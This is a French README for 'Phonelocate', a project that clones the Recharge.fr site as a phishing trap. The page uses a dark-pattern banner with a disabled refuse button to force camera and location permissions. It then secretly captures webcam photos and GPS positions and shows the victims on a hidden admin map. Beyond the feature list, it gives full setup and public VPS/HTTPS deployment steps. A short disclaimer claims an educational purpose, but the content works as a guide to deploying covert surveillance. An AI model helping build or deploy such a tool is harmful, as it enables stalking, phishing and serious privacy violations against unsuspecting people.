# Phonelocate 📱📍

Un système de simulation de portail captif e-commerce conçu pour démontrer les risques liés aux autorisations abusives dans le navigateur (Social Engineering & "Dark Patterns").

⚠️ **Avertissement Légal** : Ce projet est créé à des fins strictement éducatives et de sensibilisation à la cybersécurité. L'utilisation de ce logiciel pour espionner ou collecter des données à l'insu de personnes sans leur consentement explicite et éclairé est strictement interdite et punie par la loi.

## 🎯 Fonctionnalités

### Interface Cible (Le Piège)
*   **Phishing Visuel** : Clone de l'interface Recharge.fr.
*   **Bannière Coercitive** : Utilisation d'un Dark Pattern (bouton de refus désactivé, flou d'arrière-plan) forçant l'utilisateur à accepter la demande de permissions du navigateur.
*   **Feedback Psychologique** : Émission d'un son "BIP" (type terminal de paiement) lors de l'acceptation pour rassurer l'utilisateur.
*   **Capture Furtive** : Prise de photos via la webcam (canvas invisibles) et relevé GPS en arrière-plan sans indicateur visuel supplémentaire.
*   **Fréquence Dynamique** : Capture chaque seconde la première minute, puis toutes les 10 secondes.
*   **Heartbeat (Ping)** : Signal de maintien de connexion toutes les 5 secondes.

### Panneau d'Administration (`/secret-admin-gps`)
*   **Statut en Temps Réel** : Indicateur visuel (pulse vert/rouge) du nombre de cibles actuellement en ligne sur la page.
*   **Alertes Sonores** : Notification audio discrète lors de l'arrivée de nouvelles données.
*   **Carte Satellite** : Intégration Leaflet + Google Maps Satellite avec zoom automatique sur la dernière position connue (FlyTo).
*   **Historique Détaillé** : Barre latérale avec chronologie des événements, miniatures des photos et coordonnées géographiques précises.

### Serveur (Backend)
*   **Persistance Légère** : Sauvegarde des données dans un fichier local `data.json` pour résister aux redémarrages.
*   **Stockage des Preuves** : Enregistrement local des images via Multer dans le dossier `/uploads`.

---

## 🚀 Prérequis

*   [Node.js](https://nodejs.org/) (v16 ou supérieur)
*   NPM ou Yarn

## 🛠️ Installation en Local

1. **Cloner le dépôt**
   ```bash
   git clone git@github.com:ekacel1/phonelocate.git
   cd phonelocate
   ```

2. **Installer les dépendances du frontend (React)**
   ```bash
   npm install
   ```

3. **Installer les dépendances du backend (Node.js/Express)**
   ```bash
   cd backend
   npm install
   ```

## 💻 Lancer le projet en local

Il faut lancer les deux serveurs (Front et Back) en même temps.

**Terminal 1 (Backend - Port 3001) :**
```bash
cd backend
node server.js
```

**Terminal 2 (Frontend - Port 5174) :**
```bash
# À la racine du projet
npm run dev
```

*   Le site "piège" sera disponible sur : `http://localhost:5174/`
*   L'interface d'administration sur : `http://localhost:5174/secret-admin-gps`

---

## 🌍 Déploiement sur un serveur (VPS)

> **⚠️ RÈGLE D'OR POUR LE GPS ET LA CAMÉRA :**
> Les navigateurs modernes (Chrome, Safari, iOS, Android) **BLOQUENT** l'accès au GPS et à la Caméra si le site n'est pas en **HTTPS**. 
> Si vous déployez sur Internet avec un simple `http://`, le système ne fonctionnera pas !

### 1. Préparation du VPS (Ubuntu/Debian)
Mettez à jour le serveur et installez Node.js, Nginx et PM2 (pour faire tourner l'application en arrière-plan).

```bash
sudo apt update
sudo apt install nodejs npm nginx
sudo npm install -g pm2
```

### 2. Compilation du Frontend (Build)
Sur votre machine locale (ou sur le VPS), vous devez transformer le code React en HTML/JS statique :
```bash
npm run build
```
Cela va créer un dossier `dist/`. C'est ce dossier qui sera servi par Nginx.

### 3. Démarrage du Backend avec PM2
Sur le VPS :
```bash
cd backend
pm2 start server.js --name "phonelocate-api"
pm2 save
```

### 4. Configuration Nginx & HTTPS (Let's Encrypt)
Vous aurez besoin d'un **nom de domaine** qui pointe vers l'adresse IP de votre VPS.

1. Déplacez le contenu du dossier `dist/` vers `/var/www/phonelocate`.
2. Configurez Nginx pour :
   * Servir le frontend statique.
   * Rediriger les requêtes `/api/` vers votre backend Node.js (`localhost:3001`).

**Exemple de configuration Nginx (`/etc/nginx/sites-available/phonelocate`) :**
```nginx
server {
    server_name votre-domaine.com;

    root /var/www/phonelocate;
    index index.html;

    # Routes du Frontend (React)
    location / {
        try_files $uri $uri/ /index.html;
    }

    # Redirection vers le Backend Node.js
    location /api/ {
        proxy_pass http://localhost:3001;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }

    # Accès aux images uploadées
    location /uploads/ {
        proxy_pass http://localhost:3001/uploads/;
    }
}
```

3. **Générer le certificat SSL (Obligatoire) :**
```bash
sudo apt install certbot python3-certbot-nginx
sudo certbot --nginx -d votre-domaine.com
```

### 5. Ajustements finaux
Si vous déployez, assurez-vous dans `src/App.jsx` de remplacer les urls `http://localhost:3001` par des chemins relatifs (ex: `/api/memory`) ou par votre nom de domaine sécurisé (`https://votre-domaine.com/api/memory`) avant de lancer la commande de build.
